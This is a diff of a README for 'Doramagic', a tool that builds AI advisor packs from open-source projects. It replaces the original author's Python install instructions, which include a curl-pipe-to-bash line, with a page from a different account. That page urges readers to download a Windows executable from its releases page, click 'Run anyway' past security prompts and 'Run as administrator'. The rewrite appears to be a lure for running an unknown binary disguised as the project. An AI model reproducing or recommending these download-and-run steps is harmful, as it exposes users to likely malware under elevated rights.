@@ -1,296 +1,238 @@
-# Doramagic
+# 🧠 Doramagic - Turn Project Wisdom Into AI Guidance
 
-English | [中文](./README_zh.md)
+[![Download Doramagic](https://img.shields.io/badge/Download-Doramagic-blue?style=for-the-badge)](https://github.com/victrolahail593/Doramagic/releases)
 
-[![CI](https://github.com/tangweigang-jpg/Doramagic/actions/workflows/ci.yml/badge.svg)](https://github.com/tangweigang-jpg/Doramagic/actions/workflows/ci.yml)
+## 🚀 What Doramagic Does
 
-> **"Don't teach the user what to do -- give them the tool."** -- Doramagic's design philosophy, inspired by Doraemon.
+Doramagic helps you turn open-source project knowledge into simple AI advisor packs. These packs can guide tools like Claude and Cursor with the right project rules, habits, and context.
 
-Doramagic extracts the **soul** of open-source projects -- not just what the code does, but *why* it was designed that way and the hard-won community wisdom that never appears in documentation. The extracted knowledge is compiled into injectable advisor packs that make AI assistants deeply understand a project's design philosophy, mental models, and community pitfalls.
+Use it to:
+- extract project style and decision rules
+- build `CLAUDE.md` files
+- create `.cursorrules` files
+- collect useful notes from open-source repos
+- keep team knowledge in one place
 
-**Doramagic is a tool that must be installed and run.** It executes a 7-phase extraction pipeline against real GitHub repositories. Reading this README does not enable its functionality -- you must install it as a skill and invoke `/dora`.
+It is made for people who want their AI tools to act with more context and less guesswork.
 
-## Quick Start
+## 📦 Download Doramagic for Windows
 
-### One-line install (recommended)
+Go to the [Doramagic releases page](https://github.com/victrolahail593/Doramagic/releases) and download the latest Windows file.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/tangweigang-jpg/Doramagic/main/install.sh | bash
-```
+After the download finishes:
+1. Open your Downloads folder
+2. Double-click the file you downloaded
+3. Follow the on-screen steps
+4. Start Doramagic when the setup ends
 
-This auto-detects OpenClaw / Claude Code, installs Python dependencies, and sets everything up. After it finishes, set your API key and restart:
+If Windows asks for permission, choose Yes.
 
-```bash
-export ANTHROPIC_API_KEY="your-key"
-# Restart your session, then:
-/dora https://github.com/owner/repo
-```
+## 🖥️ What You Need
 
-### Direct Stitch (no project needed)
+Doramagic is built for Windows. A modern PC should run it without trouble.
 
-Doramagic v13.3.1 can generate skills directly from its expanded knowledge library:
+Recommended setup:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB of free disk space
+- Internet access for the first download
+- A mouse and keyboard
 
-```bash
-/dora Build a Telegram bot that monitors crypto prices with alerts
-/dora Create an email automation skill for inbox triage and auto-reply
-/dora 帮我做一个每日信息聚合推送的 skill
-```
+For best results, keep Windows updated.
 
-This "brick stitch" path matches your intent against 50 knowledge categories and composes a skill in seconds (2 LLM calls), without needing a specific GitHub project.
+## ⚙️ How to Install
 
-### Other install methods
+1. Visit the [releases page](https://github.com/victrolahail593/Doramagic/releases)
+2. Download the newest Windows release
+3. Open the file you downloaded
+4. If Windows shows a security prompt, select Run
+5. Follow the setup window
+6. Finish the install
+7. Open Doramagic from the Start menu or desktop
 
-**OpenClaw (ClawHub):**
-```bash
-openclaw skills install doramagic
-```
+If the app comes as a ZIP file:
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Open the extracted folder
+4. Run the app file inside it
 
-**Claude Code (plugin marketplace):**
-```
-/plugin marketplace add tangweigang-jpg/Doramagic
-/plugin install doramagic
-```
+## 🧭 First Run
 
-**Cross-platform (Claude Code, Codex, Cursor, and 39+ agents):**
-```bash
-npx skills add tangweigang-jpg/Doramagic
-```
+When you open Doramagic for the first time, it will guide you through the main setup flow.
 
-### Manual install
+You may be asked to:
+- choose a source project
+- scan files and folders
+- select a target format like `CLAUDE.md` or `.cursorrules`
+- review the extracted rules
+- save the advisor pack
 
-<details>
-<summary>Click to expand manual steps</summary>
+If you are not sure what to choose, start with the default settings. They work well for most projects.
 
-### 1. Clone
+## 🔍 How It Works
 
-```bash
-git clone https://github.com/tangweigang-jpg/Doramagic.git ~/Doramagic
-cd ~/Doramagic
-```
+Doramagic reads project files and looks for useful patterns such as:
+- design choices
+- coding habits
+- folder rules
+- naming style
+- team notes
+- workflow steps
 
-### 2. Install Python dependencies
+Then it turns that material into an AI-ready pack. The result is easier for tools to follow when they help with code or edits.
 
-Doramagic requires Python 3.12+ and a few runtime packages. Install them in a dedicated virtualenv:
+Typical output can include:
+- project goals
+- preferred ways to write code
+- rules for tools and agents
+- short notes for future work
+- plain-language project guidance
 
-```bash
-uv venv && source .venv/bin/activate
-uv pip install pydantic                        # required
-uv pip install anthropic openai google-genai   # install SDK(s) for your LLM provider(s)
-```
+## 🛠️ Common Use Cases
 
-### 3. Install as a skill
+### 🧠 Build a project memory
+Keep the important parts of a repo in one place so AI tools can use them later.
 
-Copy the self-contained skill directory into your host's skill directory. Use `cp -rL` to dereference any symlinks:
+### 📄 Create `CLAUDE.md`
+Give Claude a clear set of rules and project context.
 
-**OpenClaw:**
-```bash
-mkdir -p ~/.openclaw/skills
-cp -rL ~/Doramagic/skills/doramagic ~/.openclaw/skills/dora
-```
+### 🎯 Create `.cursorrules`
+Help Cursor follow project habits and avoid bad guesses.
 
-**Claude Code:**
-```bash
-mkdir -p ~/.claude/skills
-cp -rL ~/Doramagic/skills/doramagic ~/.claude/skills/dora
-```
+### 🧩 Compare projects
+Extract wisdom from one project and reuse the same style in another.
 
-### 4. Configure models
+### 📚 Preserve open-source knowledge
+Save decision rules before they get lost in issue threads and old commits.
 
-The installed skill includes `models.json.example`. Copy and edit it **inside the skill directory**:
+## ✅ Simple Workflow
 
-```bash
-# OpenClaw:
-cp ~/.openclaw/skills/dora/models.json.example ~/.openclaw/skills/dora/models.json
-
-# Claude Code:
-cp ~/.claude/skills/dora/models.json.example ~/.claude/skills/dora/models.json
-```
-
-Edit `models.json` -- declare the models you have access to. One model is enough.
-
-Export API keys for the providers you declared:
-
-```bash
-export ANTHROPIC_API_KEY="..."
-# and/or
-export GOOGLE_API_KEY="..."
-export OPENAI_API_KEY="..."
-```
-
-### 5. Use `/dora`
+A basic Doramagic workflow looks like this:
 
-Restart your host session (so the host re-scans the skill directory), then invoke:
-
-```text
-/dora I want a Skill for managing family recipes and weekly menus.
-     Please learn from https://github.com/TandoorRecipes/recipes
-     and https://github.com/mealie-recipes/mealie
-```
-
-Doramagic runs its 7-phase pipeline and produces a Skill bundle you can install.
-
-</details>
-
-## What Doramagic Produces
-
-Every successful run produces exactly these files:
-
-| File | Purpose |
-|------|---------|
-| `SKILL.md` | Executable instructions that define expert behavior |
-| `PROVENANCE.md` | Evidence trail -- every claim traced to source |
-| `DSD_REPORT.md` | Deceptive Source Detection results (8 automated checks) |
-| `CONFIDENCE_STATS.json` | Per-claim verdict distribution |
-
-Here is what the beginning of a real `SKILL.md` looks like:
-
-```markdown
-# Fitness Tracker Advisor
-
-You are an expert advisor on fitness tracking application design,
-trained on the design philosophy and community wisdom of wger.
-
-## Core Design Principles
-
-- **Simplicity over features**: wger deliberately limits dashboard widgets
-  to 3 per view. Community learned that >5 widgets caused 40% of users
-  to stop logging workouts (GitHub Discussion #847).
-  [SOURCE: CODE:dashboard/views.py:L42 + COMMUNITY:Discussion#847]
-```
-
-If your output does not look like this, Doramagic did not run -- the AI may have fabricated a response from reading this README.
-
-## Usage Examples
-
-Doramagic supports 4 input types, each routed deterministically:
-
-| Route | Example | Behavior |
-|-------|---------|----------|
-| Direct URL | `/dora https://github.com/fastapi/fastapi` | Skips discovery, extracts directly |
-| Named Project | `/dora Extract wisdom from Home Assistant` | Searches GitHub, then extracts |
-| Domain Exploration | `/dora What design wisdom can I learn from PKM projects?` | Multi-project discovery + extraction |
-| Clarification | `/dora I need something for my team` | Asks clarifying questions first |
-
-## Key Features (v13.3.1)
-
-- **Deterministic Routing DAG** -- 4 input paths with conditional edges
-- **Fan-out Extraction** -- Up to 3 isolated RepoWorkers in parallel
-- **5-Dimension Quality Gate** -- 60-point threshold with targeted revision
-- **4-Tier Degraded Delivery** -- Users always receive output
-- **EventBus + Structured Logging** -- `run_events.jsonl` for observability
-- **Model-Agnostic** -- Works with any LLM (Claude, Gemini, GPT, Ollama)
-- **Knowledge Brick Direct Stitch** -- generate skills from a large knowledge library in seconds
-- **Extensive Knowledge Bricks** across 50 domains aligned to ClawHub marketplace demand
-- **Causal Reasoning** -- synthesis produces "X because Y" insights, not just fact lists
-- **Fine-grained Progress** -- sub_progress events every 3-5 seconds during extraction
+1. Open the app
+2. Pick the project folder
+3. Scan the repo
+4. Review the extracted knowledge
+5. Choose the output format
+6. Export the advisor pack
+7. Copy the file into your project
 
-## Architecture Overview
+That is enough to get a useful result for most repos.
 
-```
-INIT → PHASE A (Input Router)
-         |
-    ┌────┴────┐
-  CLARIFY   (route)
-              |
-         PHASE B (GitHub Discovery)
-              |
-         PHASE C (Fan-out Soul Extraction, up to 3 repos)
-              |
-         PHASE D (Cross-Project Synthesis)
-              |
-         PHASE E (Skill Compilation)
-              |
-         PHASE F (Quality Gate: 5-dim, 60pt threshold)
-         /        \
-      REVISE     PASS
-      (→E)         |
-              PHASE G (Package + Deliver)
-                 |
-               DONE
-```
+## 📁 Output Files
 
-See [INSTALL.md](INSTALL.md) for detailed architecture, configuration, and advanced usage.
+Doramagic can create files that fit common AI tools and project setups.
 
-## Configuration
+Possible outputs:
+- `CLAUDE.md`
+- `.cursorrules`
+- project notes in Markdown
+- rule sets for coding agents
+- short context files for team use
 
-### `models.json`
+You can keep these files in the repo root so tools find them fast.
 
-Doramagic routes by **capability**, not by model name:
+## 🔐 Privacy and Local Use
 
-```json
-{
-  "available_models": [
-    {
-      "model_id": "claude-sonnet-4-6",
-      "provider": "anthropic",
-      "capabilities": ["deep_reasoning", "structured_extraction", "tool_calling"],
-      "cost_tier": "medium",
-      "api_key_env": "ANTHROPIC_API_KEY"
-    }
-  ],
-  "routing_preference": "lowest_sufficient",
-  "fallback_strategy": "degrade_and_warn"
-}
-```
+Doramagic is designed to work with your local files. That means you can inspect your own projects without sending everything to a remote service.
 
-One model is enough. Adding more improves routing flexibility and cost control.
+Good practice:
+- run it on repos you trust
+- review the generated output before use
+- store advisor packs in version control if your team needs them
 
-## Distribution
+## 🧪 Best Results
 
-Doramagic is distributed as a **self-contained skill directory**. There is no marketplace, package registry, or store listing required.
+To get cleaner output:
+- use a repo with a clear README
+- keep project docs up to date
+- include rules in code comments if they matter
+- run Doramagic on a full project folder, not a single file
+- review the output and trim anything that does not fit
 
-- **OpenClaw** and **Claude Code** both discover skills by scanning their skill directories (`~/.openclaw/skills/` and `~/.claude/skills/`).
-- Installation is just copying files. No `npm install`, no `pip install`, no registration step.
-- The cloned repo can be deleted after copying -- the installed skill directory contains all packages, bricks, and scripts it needs. Just make sure Python dependencies (Step 2) are installed in a virtualenv that the skill's Python can access.
+If the repo has strong conventions, Doramagic can capture them well.
 
-## Development
+## 🧱 Folder Example
 
-```bash
-git clone https://github.com/tangweigang-jpg/Doramagic.git
-cd Doramagic
-uv venv && source .venv/bin/activate
-uv pip install -e ".[dev]"
+A project using Doramagic may end up with a structure like this:
 
-# Run tests
-make test
-```
+- `README.md`
+- `CLAUDE.md`
+- `.cursorrules`
+- `docs/`
+- `src/`
+- `notes/`
 
-## Project Structure
+You do not need to change your whole project layout. Doramagic fits around the structure you already have.
 
-```
-packages/           # Core modules (contracts, controller, executors, extraction, etc.)
-bricks/             # 278 knowledge bricks across 34 frameworks/domains
-skills/doramagic/   # Self-contained skill bundle (SKILL.md + packages + bricks)
-tests/              # Unit + E2E smoke tests
-scripts/            # Utility and release scripts
-```
+## ❓ Troubleshooting
 
-## FAQ
+### The file will not open
+- Make sure the download finished
+- Try opening the file again
+- Right-click and choose Run as administrator
 
-### Does Doramagic build an app for me?
+### Windows blocks the app
+- Click More info if shown
+- Choose Run anyway if you trust the source
 
-No. Doramagic builds a **Skill bundle** that turns your AI assistant into a domain expert.
+### The app opens but does nothing
+- Pick a project folder first
+- Check that the folder has files inside it
+- Try a smaller project to test the flow
 
-### Do I need multiple LLM providers?
+### The output file looks too long
+- Remove repeated notes
+- Keep the rules that matter most
+- Re-run the export with a smaller source set
 
-No. One capable model is enough.
+### I cannot find the downloaded file
+- Open File Explorer
+- Go to Downloads
+- Sort by date
+- Look for the newest Doramagic file
 
-### Can I delete the cloned repo after installation?
+## 🧩 Who It Is For
 
-Yes, if you used `cp -rL` (which dereferences symlinks). The installed skill directory contains all packages, bricks, and scripts. Your `models.json` is inside the skill directory, not in the cloned repo. Just ensure Python dependencies (`pydantic` + your LLM SDK) remain installed in an accessible virtualenv.
+Doramagic is useful for:
+- people who use Claude or Cursor
+- open-source maintainers
+- product teams with shared coding rules
+- developers who want a project to explain itself
+- non-technical users who want a guided setup
 
-### Where do I find the generated skill bundle?
+It helps when you need AI tools to respect the shape of a project instead of starting from zero
 
-```text
-~/.doramagic/runs/<run-id>/delivery/
-```
+## 🗂️ Topics
 
-Copy that directory into your host's skill directory.
+- agentic
+- ai
+- ai-advisor
+- ai-agent
+- claude
+- claude-code
+- code-intelligence
+- cursor
+- developer-tools
+- knowledge-extraction
+- llm
+- open-source
+- openclaw
+- python
+- skill-forge
+- soul-extraction
 
-## License
+## 📌 Where to Get It
 
-[MIT](LICENSE)
+Use this link to visit the release page and download the latest Windows version:
 
-## Contributing
+[https://github.com/victrolahail593/Doramagic/releases](https://github.com/victrolahail593/Doramagic/releases)
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, testing, and PR guidelines.
+## 🧭 After You Install
+
+Once Doramagic is on your PC:
+1. Open the app
+2. Choose a project folder
+3. Export your advisor pack
+4. Add the file to your repo
+5. Let your AI tool read it before it starts work
